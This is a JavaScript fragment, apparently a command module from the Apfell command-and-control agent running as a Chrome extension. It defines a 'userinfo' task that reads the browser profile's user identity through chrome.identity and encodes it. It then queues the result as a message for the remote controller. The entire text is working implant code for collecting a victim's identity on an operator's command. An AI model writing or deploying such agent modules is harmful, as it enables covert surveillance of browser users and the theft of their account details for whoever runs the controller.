userinfo = function(params) {
    let taskid = params['taskid'];
    let tasktype = params['tasktype'];
    chrome.identity.getProfileUserInfo(function(info){
        if (info === undefined) {
            sendError(taskid, tasktype);
        } else {
            const data = btoa(unescape(encodeURIComponent((JSON.stringify(info, null, 2)))));
            const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
            let meta = {};
            meta["metatype"] = 3;
            meta["metadata"] = apfellMsg;
            const metaenvelope = JSON.stringify(meta);
            out.push(metaenvelope);
        }
    });
};

C2.commands[userinfo.name] = userinfo;
COMMAND_ENDS_HERE
